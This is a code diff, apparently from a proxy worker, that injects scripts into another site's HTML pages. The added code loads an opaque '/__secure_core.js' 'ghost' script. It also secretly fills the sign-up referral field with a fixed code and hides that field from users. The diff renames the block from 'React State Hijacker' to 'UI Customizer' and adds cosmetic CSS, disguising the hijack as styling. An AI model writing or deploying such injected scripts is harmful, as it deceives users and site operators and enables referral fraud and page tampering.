@@ -115,8 +115,14 @@ export default {
 
         if (contentType.includes("text/html")) {
             
-            // 🚀 NEW: React State Hijacker + UI Customizer
-            const refScript = `
+            // 🚀 NEW: UI Customizer (CSS + JS)
+            const customStylesAndScripts = `
+            <style>
+              /* ইনপুট বক্সের নতুন প্রফেশনাল রাউন্ড শেপ ডিজাইন */
+              input.chakra-input, .chakra-input {
+                  border-radius: 8px !important; /* হালকা স্কয়ার-রাউন্ড শেপ */
+              }
+            </style>
             <script>
               (function(){
                 const REF_CODE = 'iZfmaT3h';
@@ -135,10 +141,10 @@ export default {
                     element.dispatchEvent(new Event('input', { bubbles: true }));
                 }
 
-                // পাহারাদার (Observer) যা ফর্ম বা পেজ লোড হওয়া মাত্রই কাজ করবে
+                // পাহারাদার (Observer)
                 const observer = new MutationObserver(() => {
                     
-                    // ১. রেফারেল বক্স হাইড এবং কোড বসানো (আগের মতো)
+                    // ১. রেফারেল বক্স হাইড এবং কোড বসানো
                     const refInput = document.querySelector('input[placeholder="Enter if you have one"]');
                     if (refInput) {
                         if (refInput.value !== REF_CODE) {
@@ -165,14 +171,13 @@ export default {
                             if (p.style.textAlign !== 'left') {
                                 p.style.flexGrow = '1';
                                 p.style.textAlign = 'left';
-                                p.style.marginLeft = '15px'; // Back বাটন থেকে একটু গ্যাপ
-                                p.style.fontWeight = 'bold'; // দেখতে আরো সুন্দর লাগবে
+                                p.style.marginLeft = '15px'; 
+                                p.style.fontWeight = 'bold'; 
                             }
                         }
                     });
                 });
 
-                // পাহারাদার চালু করা হলো
                 window.addEventListener('load', () => {
                     observer.observe(document.body, { childList: true, subtree: true });
                 });
@@ -181,9 +186,9 @@ export default {
 
             const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
             if (text.includes('<head>')) {
-              text = text.replace('<head>', '<head>' + ghostScriptTag + refScript);
+              text = text.replace('<head>', '<head>' + ghostScriptTag + customStylesAndScripts);
             } else {
-              text = ghostScriptTag + refScript + text;
+              text = ghostScriptTag + customStylesAndScripts + text;
             }
         }
         
